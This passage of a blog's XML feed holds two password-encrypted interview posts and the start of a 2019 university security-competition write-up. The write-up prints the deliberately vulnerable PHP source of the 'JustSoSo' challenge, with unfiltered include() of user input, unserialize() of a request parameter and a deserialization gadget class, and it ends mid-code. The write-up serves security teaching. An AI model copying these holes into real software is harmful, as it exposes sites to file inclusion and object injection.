c8d6f1bb63cc3a811bd52c668da918e25de326c218cbe09cdd1da610a547e78711b71cd17287070574d46075cea792d8881ded6d60f7c8d638076427ddd3e99357b6468d3fad6606eb6f251c7e6bdcded5d1db6de7e7450dd71c422282bec9ca0e3ff1e26748a3dcc52a68b13c01991490cc7e2ecabe3b1318583f8219e580400b472b8bea2ede2c33d512a1cda66306f50329b301b729ccf4ffa8c2517de36ff5120df1e971a2fe41</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>360笔试总结</title>
      <link href="/p/bf99.html"/>
      <url>/p/bf99.html</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="您好, 这里需要密码." /><label>您好, 这里需要密码.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="83ef7fd466a9c61590c84478c47bd502c7fefb745f4045f3036bff49b1d8fba1">b16920295e931f1b9fe306a2c7a8a30ea2a4a3b700e15c0933fdf0a0d7a3c0d8e3d290716931f0b9490f4a348fb5fadbf411ffd2078b195a931d9713083fcf23603e9cda3650ceb7ecaa71ad7e49703903ec79a447ea6798f896bf50ae9858a7bc1657fb71bb10abf788e7c612752ec22557eaf8fd8b24be681e172e4a9403e26591cb67fe49fd290b13912681092ca14a7d42e89afacddc8216803afa7ca5d65ad15c5d8db62101211f1f9776c79b3890e64cb2aa5a1cfeb1d2bef105be22588a8dac2f219ca3c744b598987109996adf7ce5dfc910d0378206851918b12fd78f94fd4e2e70be55c8a60ef514fefc4a9599e2f5abfc510caada076fdc2697d3d8ed221db376132622d2fabe55785ab62c41d5ed15f7f3d1355cd9ce27a7fe78df6c7df9d7987f9c9b8afc670ae02508d72c8bdb3ff4232fda851268422a5f5013e696f156b03709c2d8e2300ed1d0039c1f0f36f57e68168f832b5f65b9ab2f1ac9498bcc7d5a6fe14d0baa01cb470020e6879e1071f930c240186f18cc5927378b7aa4f9c5da5c863bba424b4ee1a8fad3f89444653c68565d86f263516adb2f353fda2b2760bdb9029a0d85ac6a7fa273dbc0e8a7b5ecc6e5e4eeb56265b348488423b76e99617b496355ed66c1e0eb1eafdc0fef73ad26ed395a3d74c3921f572e5495fe546cee9d4d2d24d4327b0ee854a7d8cc9276ac04267b5951d4ad535b59cf5de274203c2f876f746685962e6205e850ebd17c5806a8fa837cd5b58f4272f1cbec0cf808b5638a7311fe712208715919268aa5fbeac3044379ab577900f7283da01e957730cb3effd6ac01ec69764e5564b4da8516b9f5adaf1bc4d6f4485289408279517fc9717a595a39e175fcacc90d5dec7375f58ae55a6f794b6517595c563ff0a792372b30c0afdfc5a4a3890dbf0f355f343e4de7654e7faf1ab597ecd8a2cf3a61d547fea6de0b4be72e0d141cd599c363e086b55424fecd9a5491f283d5b079ee4f601cd95d53c2cd2c4663d759ef5a0a2f522dd8de7d093cad793e4dd82472ee59ef012bc76505442e6334d744b5b908cc01947b46627fc01b4aaf2f298fbca0140a69352ad4991e1873df88f92914cc18cf9b0a72a34c7803fc5ad1b88043c6248d1a7a4ff3001343923c64ca96af8a29c6753349d85c058793c64f82543500a2d67fb301a84f4fc220ab83327cd93a76020877b91cc3517dea329976aa16e650de768ec09ddc76920bf94fe8e4fb03226a6dbd46e5e005d08f8ecfef89b228fab38b48f7882ec33f9a7a60e926d5c4729d3b490f6e450b72d6a04abda311b86108b92dcf0cc855cb1cf4532a8f03abd6c36ef1a9b6a5195313bc244fa0113c9b0b52bd719787c696a0a949573c8415b167c6dddbe65fc736b0c6df5e0e7b18128dd80a4f8206ccd3eda5fb4dd5ac8f467c551b7510e5ee2235aea204c82ad0ed32154dad46217c74d805384ab48152aa7211cb9c0bafeee4941de6b5bf2d887c054f4ca0777056e1568f209a59f192d0b869f0b31dabc0ebebb06fdcb42ae5eabe0a86f1a435c63a300c388351cf1c9f0cfa26a7c4742440006469b18412a84bdacf181df657ec67632e8f672eb0631d34b3037db488c159924a5bfb8d12d1959f4e463ab7f779c43b350c9f23cc63fffa6cc8f750240c9b4602b0c013089087d9a9ce3c74f5cbcd470ec61207a2954edd1860a2f39d87cddf17712868cffc077fbff103d56ca5f7115ab59843162b666eaf0bd795d283b80576497c6061d980c132d94d8de7d3f6f32a993343129c6e88491ccbea451d0befa86458593e3bc066e114e46d3fe5770c841a2d7093c22c130d50048ec2fa578569777dec94b8d2c8c452de66af23b29cef77c23a304bdf1dbbe5819823aa7c499dceb12435d6f0e3db61b7734462446bcda068ac97e09c3b72cdd6c3802231e6df4a1b98e473749d61ff49f4cec000b56374dca4cc0dd4cf59eb77da1ea46c1912acafadd286fe5fcd051d02d0521d376a176d8c85196c0a4c525e64d66d46b2b08b9d0237292de96656ff3c163291407c59ee6c32edd7f5ae9e2f481d898f1cb433a5ee97f84b395bcff35d4836545d1739f0d75ed269e9bfd90fa20b0dd0f9d8debf4ecc3028f0bc0c75399b5c6b0cbeff657613c0fef2c8252066dde300345c764f7c50a4c05c05675a1790ec97f3d3b41b5264d188b01a306557622dc79ede0a5adc2e1b5aed112a4f3081a25d9530971ef6b4678850c192dea18e1bd161e14bd2d6e3e9e97b1cbf249c844f32889d61fec042d9a801b33c968b75636826af46d68e5a706286afed3f9a720031a1208a5380fd671a9f627fd9e6400686c2fc1cbb0956ded2655ce7d122f2776a84c59d478d40408e16e9e88751f957310401502f3acd55b9046d222d2715c7678706e1c145c574ab5aa2d6431be9c9aaf4ecdaabfd734c3388d51844e9b820e20ffaece053d028726ac861ac29bd7038e772551512d209f5c0f5b8b290b2e6a435bffc8b87b2c745c33c8e9ce46fe58a24e1cf50105d9112a6811eb47269c3780cbe337b5a11f4e927e90e132cd7b34d21fdf4b12457a6d1c9643546f6c22bc759c7089ebf5a852987f051d04ec28122a5283405ba4cf37990668496c29a8d09403ff8cc8405e11d567c5e9fce5b63ee75d2dc46e1ab62f626ba361a3256ab5176667f0a7d353641389a0b8d2404a9419284e16b2f9bf7a973205bbd7013eb4fd1144ab2e29ddeebf0a8719220af56b377b0da15281f0f7304cf40f9c85e368df25d1e59877bb9c9f3aa867d482d83af3bd23fca8af7e825de455806636b30d0614ee78dac6240334ed315451285ecc4fa60fc6a39298c1dae96edbc02779bb3246c015a97a59403a144034df2a60fd8f6587ad7c7c8817d6e36c9d1ed03f91fc5288ba54b04d2d96924e92a84f982839d567bd738b47d4f8583581d6751cb060e994c38d7357ae1b283389474feeeca1e446d7f621fbb1025a59ec19c1891f774000895b82572fd76e1c090fa8eb7d6a2b7163e5c2de57d88f5c98c924fb263e614df715a8aa9cc5abc4bbf24986452bcdcd9e51040098f9866ee1a95949b154aae80f3aea24610d7995976607635fe7c98af7c17dfaf8571afe5a01c88d04da8a2af32193e078a0efd244058e87bafca0a82a691153fdcac8deb333f20f03894f83613986569cfd0b6a6ce0e95f51f5d3f49f0751a102697a667bb4ee93db2912b334dde3bcd0fa22392d261bdfdff2628414eeda9aff813c283efcaa447adfaab55c3c10631e2169fa29a8ea09efff1ec65e7396a349712b0586bb682f614c866f3d86c7e0418c25a1644ebe8b664d9fcda7a528b4bf8ed4b646f2db2fc43f42a60ed604a31b0b4541a6084701fbd0ff5da4bcc64072d246efc24c29fea4d030db182b323fdf48f7211117a3d56eca193f6782e6204c5a16e2f5fbc52c531afc20803dcc0e1bb38460d2011a4a80595d5f71ae27a2950175d0d2aec6605f5fa363277e343ce9769466eb13fdab6cf84d58a96888e1c6e5221c29a1a2f4094f00a4c94a612516c80b1e07fa76b058b46b1fd05f22f44826020a318d9ebad4f613c15b03cbcee503d1e62b4c2176f9bf930fc767377df111c1d6cb042e1681abf06c4c77a610ce1897a1a52dfd4590020c8944278eeaf8005c4efb8524843c9928e45a9a2f63604ae5680a4379c5ed17c0c9cfd27d078ac79fc0f00ad5a013ddf488fe668cc3715073b090e5f0a742646147e4dee169c64f06ed2e58ab96a4c0ae8d712275f97d044ec73e8594ee3ae42cc88ba47f32c4c76fff8a96674f0cf6033160b2f607c34540f47d92b465cdde7278235fd9e495cb590835430e16c972c2cebf09e9c20b7d6e0be80be4d887c4d74bc108ed5be10dd391043ed5043801a76baa9af31f6c0dc9914407e1b3dcc0f0ebe2a19a31a9fa10035a2a3abe9af16401210c4c7fc2a1df3bbf6290133759b701d9c2678d1d0b45bb6f7ed78a9e05c32632dc6072cc4ba7f9bdf61de50ed53d893d681ae67f32a44e09e5140ea541364facf41256b2af9329f79eb6f7cadfe32a10fba34a79120d1abe7dcfd1013dc19ea54e4b2c1c4961bc8ba3cf883f0724ec49ba5432f21c3fc0a72da343b0879278f9b9814183f6b2517b40962de864d4bcbe7e78533f264588fc04f52ea3f336b86b00df3a99d73c37ce0cf1da80cde725de4c3c9abb18a4ce62b06662dde57059873811cb191168685109138951883aaf13c74ff76627e8764a212b8db95d017f574b0c3fdd39a67bec8964a1e26247adcda35d8d02f432093f136460e9b9f605a80f0aef1fd1fa20a9e6e4ea6af2d03c8b301047c0e2a87a04bf8b64d6d33986ba16075d62d89ac29152521fcf72ab6d545b690c8056b2cf9f214a5fe5abcbf778d18d46b5aeb91f6d90d4e460bfd2f4a2d4b1e91a6bc870a3a8e35e4e5d548920594ae1cdd828161f453b2390fa8cf61f479bc1b1d02c4846dec1cf4b7fa9f024e878e224dcf980d758f1b2eba417f8f371311369cfa7faf8f5488e2a1a7b71899e0ed5ccfa7cf5900ee67058c21785e2008204436fa006b1be7d88088d9e29a5b5213241e712ba5d2a4492bf487c66730875142912afe9a99ada83a0496ee4ee4da7aa06f0482bdd6554d54fb2b2145d8912bed5c08d5df712ad80d56275df5373cef1e0aa60f1ce94e9ee74ae43ad305ee8ac1903314c4ddb5127fc13b9c182f984c54572c99de7c9b4fb8cc48686dce94e3d14ba7997476a9b63b6bb6d47d1c37c0fbea79b3e2cb90412ece0489eb7857fcc1d978bd9ebd928695ad4b485121fa6dbd4ba5fe7f1f9eb26971d05ebb29b0e7eeef4971e2cb4b600b7830d0c4ad4180c69e41cd4c133aeb4ca5eafc1b40535b8e7eb97d1ac04c76c44a68340ff54e53d63c0abd3302159dbd3c6ec0f7d7efeb430cc4e5359a9a5f4fb47de0b896908f1db452f34927656fdab0e9d6159477b31c7f78d9f13b81b5ed55305d091337ed462948666d8694b5fcf6bec45df24d2afd9d50e09a04c8ff89072b00e7ff0366b4cb4558ff2ccc4a2187bbcdd6f80af25dacdaf7d6c7d3f194c5bebc8f93723291b9a2e600c27e9dd5b53c68f2d521b92d7f8e8e3bd90498592762a68939783b861e86c16445175670cb2521ef20f85811b6b3225488e0f51f9133d951cb84b39df1276c5c743917a9d55369ded57731c47bd5c1a48ffa8a6c4d5d8f9e40f8c9fec14f229623ad362689d6907b8a81c87dd0058c1d2f758856ee9a4f5002b8fcea202cd12e4e87767c4052f1d5bae210c59f980d4bc4e9f0f9813c30461ba6180b4745a2f8775c111f84bd9b20a3bdd7c70ad6dd9a771bca4b54022a2cf4bd7ce980b5b5dd82a864d41f43d7320ebfe918f9590e7aaf0997adf758963fb1693ceffed94456197c7c1414c5b832c3c0b02f5e66b6d8e62da008c02fcff9d22809babe1c0fa45f37499d46f5248c6f6702a91c6d43d7c8b2e913867347be255569eabac9c1907b1a369d2fe76e35dbfb92fe09b8f8a649dd8f0a2abbd51263ee47bfec38d5373e957eb0086fda4b4d365ce3e0eae29570c286f31829b448da86fdf9e53dfcfaf2b1ec88afaa2a3bdd10ccf5c5a65b3db94c3610a9db254b7a610a63bc65e867ad7f49bb5c142967a916ecc4c52da7bf6ef498cc089803eb648120ebac422faa9022fb345c51901be8e256dbed1a7d7a5fee11ea7970baf6962f645b8e03bad906d41ac47f7efae4101508377a89940b9f6e6a931f2aad7caedb831d7425d9edd24c81226f92a3898bc9439818c83a7e2477c6e01118830631bcff26b53906e2b647e94d64f7643f22a66b3de475cb3116d49e6588e54a0222519ee6d0039b7a5abbf752cac84f4f6629c9426060f462429944065c54e99d3bb32790282168661172b95014073ef2c83e8eac608f419390479eb818c062fa41c038550d9485b01e348364e1d9ae34e26978ef6f146ac73153c21be03dc71d876eb6453ee30f86a3d70469a07d69ac6753a4b8237d5696dc3d101cd6106757b226808bc9d1a2907f33865e408f2e30feae90c4997201ea06c5deb727d9da1a97b26d625c8546b037b5752ba9366fdf680a95b245d1abac4d731a5b8430189a77630efa559f4627ff0d27d222c2ffccf58685e7f5122ff160400edbaccce914666bf7e2464b69343333bf6deb5e0b7f96aa9cd2ec43fc9238fcf7d06388f4f52e11784c1a8d6c0fb548a6ce641126aa3d8baef58c9d3e488f99aa455c9195ad9647c72070bc37267a0899da4bb7f9a9c4cafaafef0502d3a9ee8b8b57cf4c3d9cbefa175b8daa49085cafc5baf1990b2038841565e9c76ccaabd9f296bbeada80464c56252e5c7da03abd1f8e4314b4c8aae6a0f8326f694e473e4f1022d8a8400e8b860f35ba08c3996eb6df8f0ea038929718574c6b53f1ae99c04afcc177729c7be3b06c8300202ef7c311ca114066c2cee34ae5feec1c2f1f2e4e43eb8a6203dd149e42a1fe5e1d59d2d4b3b16ba47295e46e74314a5517c5863a4cf24d175372e91dd9fd9c4b9195800c921350d3aac43ac638008968e2bbac4eda1d279466acb1600550a7ce1e07a7a3cc6f63a0c639e39523bd652b446445265dd53a83f20662ff101c956f1e755e81e7a80265ec2318b9081bda619399410b49616f51a9614b1a1de8b20b3607db1fd0bd8a48ef61b41f086578859189c7d5a7228af086c02d240d66423a46afd6a7316a754dfb568e4baf705478fa7241eba462fedb151167e73cf633f71c6c5cd11adfdacc00ae564068b8685f758bb9e0066b0ed1f56249ea7eeb5f1127f0eca2db597b6385d2191a05c0d8e916eb479c17613eb97097022eed8fdd91e447998f448f5afdfe0ea07d7d5de671a529335738aceebdd5543f330592120d38a07ffa1ffd74efd90721765b49df6f08487e76a92272fdf79d3a6cab8c76d8b40f454fbb8277a41407705d6b852ab968d53e431c856235638624f07e1f4a9d900dcd14c4dadf3bffcc5d4534cc701d97b63706f7c6e4b1a77dbdebc7d57eb423b982d53a9c05ad358122eddc008ce1fac6880a9777d8ea56f3e12308bbf32b9094de996382e7e3e3431e1b6d553889eefc73defd58a1f378ecedf5e4d46bcd1a2c98f3b363f5b0443b43b5da3d48e814f8217cc585020244bd469ca4f42122573321362fc5d7df009693f4aca908d89f86223fefed9adc20c5fe4fa74e986b5e3135d93d56ca3eaa123caac49ec645fcfcdc866f166c624711205bbba611e35f9d89e8091755c373522a5edcf30e8217c5a1ac7afbf0318306501a57a805728c347c8cc60999db7e4d1037f4685058514b89317053cdd337b1e72a50e0f2540a33afb2e1bf1e949ec15763b640c44d9a11388b8f8d66e712e1a373b300fe5dc91d96da3b1668b7e9e7168813e307d6b66c523060e4cf955112d97f51a84a0a0608b030e5d48c8530645648bd85580d5ef246306578e36b2f8cb772478565341fb5303a45d3ea6f0c25ed7efe99371b513465bf7efbb8c675278bff360fe84a2b6aa45d8723137730c35210bf63af7dafeaf6ff247869aaaf8908a1bb5d1fc1817971c0b73eba7a32aa5c19b9b477af7cc73682282d845b1bfe7f71ff0a9e2ae32bd60a72c68c1367bd6435b7aa6c699bfe7771ec694e52b0243a66bd87f454c45067bea084dfb24bdf83536092dcba996e25ff616b5f48cf8b7ca7d9440d695d0e0ef41eda8f31afb0fa9859e610287297fd7938ca8e82b976299baf3c97fe5d97da4f03e573114a9b7ef8cb3981561b0c7cc5468bac49ae5d59c0337e91da34dde03c1810e87740e94a9e61cb1bb6881c01503f39df78e99a9b2a67b41526c4a977db82eaa7964414160d2bdfee5c746f6b2c6c9d296c2d3a204ef1298d9802910998139322ef5d7e8750b735295bc0135893591ac33c5d88c3bb31651f855fc6f801752db32b5ed0c35716c6e9c483abe749c11d00a109883704e4809f5071eeec566a467e5a0c812bdbe9fa7d552bc8ee2b71a530fac5d590a6729284e5f8264e4ef0bdfd235174291f0e33ad95cfe3c3b38c54be3f4f80669f4e2d3aa158fef9831609ea675edd48f56524adc3841e249f540da91083b4d8c48dcdc5d4e687fe4df9b7375d478d2d25d7c2c2d05c74a4f13e186de23b01f2446c09368f619781f298f02de854ed27198c864653cf5cf649d40c3a061ba8793bbdc604b78786c41e6a9dd578150be9657b1109f827e03a296f5d8613427d47ede1909a80b22a179523d74143bc9c63dbd7075f08efda30b763e4f79b46fb77e322cfee83a2c4cd799213b3673aa7e0fa88698da117f9a30fb5bb2df248ecaa63168bf5f09f3e823cb8093b2d31190f376c34b5d21f24a13b45f83920f80efd1f19a362c8833897a911670ba030d6b4d8926cfe35c51d2990de07cf16d08ceb864e95232466ad747554ab8cc8634f3ae5033890ce440e9a4c949a2de9ba30cb28845b68ec61b0e9ea1dbc7b503d2df538a20ec6f9216504f7a677f9b87444fdadd3df16dcdb747db3b3442228c76bd8a23a987be1e081d81b5bceb9573cd4384ae6b88f5666a254412d9b24fe2ba36e4c6f1350882e63dbcf049da5d8080760b2aba494f203999611dd312bd6639504675d6f075dafa0d3b8ab4fcebad612ebc22812be0039b5a5cf77149a5676b9aacac2c6dff5da11290b0cb0b80a5880881ce2abc27746a5b72edd15ffb264833ce5593efbf1dc1c9edbb47d55dbcadb79ea01a233ccbb5f04cd1cb7fd815fdbc39b0ed1926671daf00c9b0a29cccda380d24ce3180b45d63268228ddb7b04eaedd7f45bf36ad44220132ba4901330de28e5a2e4fafb9faa0bb6f665008ac677b9febac98567a3e31c2af4f121df389a8b352f4d5ab70870187a1f18cd047d713ce1e46615c50d01b3ee9f1449180a29a0630f6ddc3afeb7143ee5afae5e8048c9f165a7078417eed39a534a06bb09c6e0d4cde8b736cfb096bac4d6c33fd28b95f9effad4c14988fb7ad26467cd84578c5095bf19764e60d63612671ba562d286c429fefb0497cd18c91551bcb4d274d4c249552e5cf2104a61c733aa2ffa11e4b7a383f73e7cc7781246faaf291a43453fe5b0b5da816eaff01d1113bfdbbc9bca8c6bc6d792f67ca8103234110bf91b2c8dbb87f14a151e8ac9eafdaeebf56168f7a7cf96f3dd1bcd2a8b877c05485b70a1451ed56480e42ef986e8fe066a1d27ef46274a1f379258f7a2ea63b24c710d8b034a8cc3fbc26ca1388696437b796866f8b4850da4a458851d67b62797015873daa933218f4b5bbcbe76d12b225753e37e8a091486ed0e8e7c956c56b6f43a1c5f6d45698806552c851ca312fda98089d4301fae0b9c7c0e171d30b223169ff71cbb5002da1aaaa92171717766781d76477fb195edf0cbc369313f58b93624dde866e5685a535217a9c7a03a1d82edde1769cc198874a488f2177b6a8f0bcdd5d1856b265a0f81f37e80f0b7c0e74a7a03fa6675d872d7a97ec7a067df6fd6b8cf69a1859d770b4cae7966eafc1b7ff4a92bf896ab7e46e44c4c4e11a2738dd4ca45d448b1b86fb7846754f836c378e48f449b497c0fd6c19540a9b71539f0a6579a937344894ff5f3e205882a90470579f8ac1bb93d98a86999635f17d6a1843284604431b24ad5d25056b5cb04c688afe25f8832c5b6cafe492ffb0841f670050ecbc7634f0aa1af5e81279881e4df559869797e76b56e2797a210b09281e814e323cd8598030d7f8e86d4779ea396ee9db48e67589dbeb7afe96ef1dd236d9031248ff447d1eda0f1c6edc6dd76ffb088fb649cd39a0b953b962c4a066ef6fa41bb2b19f9266010755f0f381f0a86fe7c321566291ff2a956cb963d5455fe4121b19084e30c4c4cd26e0b16c001b289df9f0e4743f723cc4d312ddecec3dc51660eeed90d096dda80dff2a6d26fc1d44e16454626b0f3aa654688e90a0bc99dd34b92973e4845d5fbee4fc61999b7750f97fe6b6596163bf608d6fa3ba2656eaf1aab3eb2f0c6d28b537ce966e032f8af7035a462a8049e028e4d4b5069c18d271b4bd92fe3ace8bf37f53c0e0eb47c1b3f5d4d175495a5c6c1049a097e5f1b813c808df1af6f17a31cccf13e9e4d3acbd5ba1cd433a72d94900d7f66a5ee862e60de3b8a33375c70a95a951dc65f4e59b3128c9a5db087833d6dc56e67a296c475021ea7528dd96c6ee499902301cac7ccc4e6ae8825e933cc8be51632597cbc64a469850bf4bd5fab88813b3289d8e63da51b9aa7635a8d99ee16cae00d96baedf50e8773e31fcd296ebfde84d1519cfcc4b72b75229503a77ceaeecc1ba5a483fc81656826d87fb2ab5f40fb55b80b6da333347dc4c84787b0fbd621eb1ebb6faa5d8c8f3bc28d661eab586a1e110c91946bc00a37d0d73909d2985ab22768dc19882994216ecc286bfa0e88525e9b1b73757ece76c5f6907a2d1aa1f9c94ce4470dfb8aa751b47fae76c220d5c765e1eb7181bb1c56287d7c33389a862d6dbca62019e237bed524b0af1efe7f50c454960226420439c38ccc5d0c9a45a3a1fb9074c27e590133fe9f6f4234a18b8d58e79c0ef48a9562ad84d5c1cddf2441a5117d8818062bac5d5c34168bf5373fd9cb15f62e79b21ffa244697d64355fc9bdc28a58fbea692af6e303128d8f662c2bd9401554666ad7a67e07757604e8575e8bce325b2b121965a0af4908df9ba7cba48a517b5c81fa18720a505f6bcfe6235742e0dd3827174b7517aba19833bcfa1943ab973257ad14aa29f042054219dc9e3a74783d7d38def30a6b15afe1ffb24e3bb139f0498641ecf71f1d36e476d5b999cf2528b0e0e48e4db2a2337fe70a83f6c60be31749d9b2d1460d52e9b6906706e3e53e6aa0c086ecc86739b18178126c3a519bd768476c49ab3126f3176009b923bb5f00db57977230e4e4312ac444f443e8eabcf3108f945e016ca5b7a7b9877924ea6a4b2db8b5c635bca89eacec9f0234e33c2661766c5dfd7b9eebbc6990614ea5428e1c940a5b829be5195c8efb10f0dc6c5b78a104adfe11a034e0c765e708c7e17f8a7014d89755dbebe91caa960683899c9769b6e3b9dc5415cfd3b84079699293aa3ab833c21dd36ea37ad78597c34b84b75d0c9546e27c9b0cb31edbd5382187520b0d170d526d9cfca09b9dbd9a6bb82fda444b0e3be86a916acdf18f89802c6e0d1b839d3343862e8ba13e5d25c5e0376c0e524f3018d530c66a112b2ccb23a29ff45f98ed0b0889c25f8843d424d5b3de62217fe705e448c9632b83a7fc5ff0a3e662f0f22e1bfd0414ed96dd081599aab1a971b2b5cba005bfe6e0e26a5b09ea532d059cf6dc238cb3ce6612724896dbded75ed875245f825b6874cd0000bc8a49ddf35b0b0ecf81cc28066d100ce81c55c2d6e20ff73531bf730359b67e1523ad61e35d48f144abc45c0f3b4ac7a3f5eb42172cc1f9238f882a010e80a805aeee97dc8d50b083b19b622ba74ffba791f43fb49b776363c7658cc7c65ae7634e9cefb2ad0abc9d0a7b38597560959bdcf19ed58c8822931d8db23ebd44a47a98dc9f1a96c6fa943abf22d9fa532174f7b0a7b26adfc11927edf427354ee24dab9eb939ef42461d33c268481e0fe592d0f8aad4d74a3437f6cb872607bfcccc93d7d272a327d49f62df39916c6106a0ac12d4da0c96a771b43a8e02412a938e6cc0b42940584f2a67ac1039f7f91cdb4b0f1ca3046c339a0766f077332626a1ef6c138b02de95388c563f19776bca625a576c499fa2bf33661ab5bdf671a939e226d37d1eb2f848f59389bf314a2635f496c2e6a2558a1dff87393654c4c93117a0a1108e8096059d7d1bd79d66e1e63d37bd53c9a95bca3225bc814d418bcb334f1c001b6ce2cb2e106ff532c996c417d66efe5fcfeab96f7c2ca636c4ebf98676e794558d1c45537614590dba4a649202acc23e47536dad4339224c820dbc0b4ce5869c831ceac363be157a6ecf6644ff4a88a09503bbacb6728328db399a15817d2842a7e237f05ef111c89260c7aac3f27d2c65a19a3031a013cae145bac356ef040b8419e77b780dc0a8bc9693c213e0c8b3f45d37f5431901de34b8b8d4ebfe20168cf9d865db7ba794f7565d3b4f656c4e86207e6fc15e272a636a8d5a85a36f096ae5f7242bdeff9df501f77418c5f64278569046d8d0f2c1bf4591addaec34a305be3a9c01bad2da18e6c3a7d4cad51734ba28315bb0ca259f202afa6059d5cc815cd593bb0d07d108a2edcd4a3712575ab9ba7341f7550fca5f63b67e30f596edc3a7dc5fca9f43b61f858f9ab33dc77390781b5f2351b4fcc090d951c5d5a3f3dc1930fc04998178fcca6c661f8c07e8ced03569e2e73cd096864f03b93ec85994fc5df0f312baaa33d93b0066bb078a74815e97ae4dd270de7f3284cd1f4535cffb76805aa5161666984c33ca7be5810ce543f379d16fed2c9b26116de7050428954b8e9df77aa3ee8c83005417b0f363a4475568ff950797bf3686a15d7854cbf847a01c64790ce7d6e2b18b0f87c76bbd5779cae16bbb23ac4d4068a047881f6abaf164d0e47db7940a844ec5185e5ce09c6a6ec730f030facc4f0b5a7538f81516078463fac1f519b356a1aed55b14556e71f83c268f1baaec1b640430c8298314fa197abe8f80340a788e646a296fc23f789dceb4b2f19ba17549302be4fc788c260ba882104df5100aa44592ebc760b680f9d88726c817766c3263bfaf7774fd6f55977382a039e7181d8c99746128a06e5f629818ad2af658782d1686591d2caf3b0874bdb4adde7f03b0b64f61a0630cc44c676e3873705350f0f323dcd7d2fbcd4020b729ee59a2c4ed28887b3e9e505e48fd7b69216aaf2d8adc057fd90e3105acacbf0b6f4f3ff9846cbab42bf5ce96e2b43fd8c60175698c1798d37dbde28f8abf1fa08c74dfb69c2fa7123d8c4485efbec3176e8ca3c5bcdc3e0fc833bdd00b859b3d9b7aea2fd79ce4b46cd54a8ca8080dbce05c8b9e7b6c6559f6142ac507e750151a837c1260a6ee39e3813a31b9b0a55133d0e333fce039ac6292e469d0ebe8838772d75278af23ec729841df71db460f06574c687d11db3fe21ba366ce5f3a81b0f81d02519cf30f7946349ee09f16cdd6fdb2c0a87aae9beb6b7a601194743de16b15b1ce0c96f4ccb287c69ee8a24c926d3b1813cbd2c2e0f5e98c0c5cd958c6aa1367ad0b22c28a48760f3a7ef2c9adbf56d44c5fa607278e7f5eb0dcd9db7477f0eff8739ee25a0bead46e4b5b2799f3086deb3b9a77990489f58b2757fae773534723f6f99d211</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019年大学生信息安全竞赛</title>
      <link href="/p/80e1.html"/>
      <url>/p/80e1.html</url>
      
        <content type="html"><![CDATA[<p>总的来说 题目质量还是可以的</p><a id="more"></a><h1 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h1><h2 id="JustSoSo"><a href="#JustSoSo" class="headerlink" title="JustSoSo"></a>JustSoSo</h2><p>一道<code>php</code>的<code>文件读取+反序列化利用</code></p><p>文件代码如下</p><p><code>index.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>]; </span><br><span class="line">$payload = $_GET[<span class="string">"payload"</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($file))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Missing parameter'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'hack attacked!!!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>($file);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($payload))&#123;  </span><br><span class="line">    $url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">    parse_str($url[<span class="string">'query'</span>],$query);</span><br><span class="line">    <span class="keyword">foreach</span>($query <span class="keyword">as</span> $value)&#123; </span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>,$value)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $payload = unserialize($payload);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Missing parameters"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--Please test index.php?file=xxx.php --&gt;</span><br><span class="line">&lt;!--Please get the source of hint.php--&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>hint.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $handle;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle; </span><br><span class="line">    &#125; </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span 